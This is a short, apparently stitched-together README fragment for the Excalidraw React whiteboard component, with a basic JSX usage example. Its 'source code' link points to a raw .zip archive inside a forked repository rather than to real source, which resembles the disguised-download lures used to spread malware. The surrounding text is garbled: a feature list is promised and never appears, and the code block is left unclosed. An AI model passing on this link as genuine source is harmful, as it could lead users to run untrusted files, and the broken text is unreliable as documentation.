Its [source code](https://raw.githubusercontent.com/swethaswini/excalidraw1/master/packages/excalidraw/eraser/excalidraw_2.9.zip) is part of this repository as well, and the app features:

### Example Usage

Here’s a simple example of how to use Excalidraw in your React app:

```jsx
import React from "react";
import { Excalidraw } from "@excalidraw/excalidraw";

export default function App() {
  return (
    <div style={{ height: "500px" }}>
      <Excalidraw />
    </div>
  );
}

We'll be adding these features as drop-in plugins for the npm package in the future.
